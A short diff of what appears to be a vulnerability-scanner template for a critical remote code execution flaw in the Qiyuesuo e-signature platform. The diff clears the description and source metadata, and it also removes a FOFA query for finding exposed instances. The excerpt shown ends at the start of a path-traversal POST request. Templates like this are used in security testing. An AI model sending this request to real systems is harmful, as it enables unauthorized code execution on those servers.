@@ -3,12 +3,8 @@ info:
   name: 契约锁电子签章平台 paramedits 远程代码执行漏洞复现
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ksa1o95v5kn79sur'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ksa1o95v5kn79sur
-    fofa: app="契约锁-电子签署平台"
 http:
 - raw:
   - 'POST /contract/ukeysign/.%2e/.%2e/template/param/edits HTTP/1.1
